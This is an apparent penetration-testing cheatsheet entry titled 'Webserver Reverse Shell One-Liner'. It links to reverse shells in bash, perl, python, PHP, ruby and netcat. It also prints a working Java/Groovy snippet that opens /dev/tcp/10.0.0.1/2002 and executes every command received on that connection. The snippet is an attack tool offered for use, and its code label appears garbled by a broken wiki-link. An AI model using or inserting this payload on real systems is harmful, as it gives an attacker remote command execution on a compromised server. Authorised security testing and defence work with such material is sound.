---
id: d8e21107-d665-4bcc-8370-cd02502b7894
name: Webserver Reverse Shell One-Liner
type: cheatsheet
verified: true
created_at: '2019-09-17T20:45:43.138990+00:00'
updated_at: '2023-10-10T18:30:00.297083+00:00'
---

# Webserver Reverse Shell One-Liner

**Status**: ✓ Verified

# Description

A list of reverse web shell one-liners

**Command**: [[Bash Reverse Shell]]

**Command**: [[Perl Reverse Shell]]

**Command**: [[Python Reverse Shell]]

**Command**: [[PHP Reverse Shell]]

**Command**: [[Ruby Reverse Shell]]

**Command**: [[Netcat -e Reverse Shell]]

**Command**: [[Netcat without -e Piped Reverse Shell]]

> Java Reverse Shell Code

**Code** ([[r = Runtime.getRuntime()
p = r.exec(["/bin/bash","]]):

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \ $line 2>&5 >&5; done"] as String[])
p.waitFor()
```
